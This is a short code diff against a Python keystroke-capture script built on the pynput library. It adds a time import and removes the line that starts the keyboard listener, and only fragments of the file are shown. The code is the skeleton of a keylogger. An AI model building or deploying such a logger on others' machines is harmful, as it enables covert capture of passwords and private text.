@@ -1,6 +1,6 @@
 from pynput import keyboard
 import logging
-
+import time
 keystrokes = ""
 
 def on_press(key):
@@ -19,4 +19,3 @@ def on_press(key):
             
 keyboardListener = keyboard.Listener(
     on_press=on_press)
-keyboardListener.start()
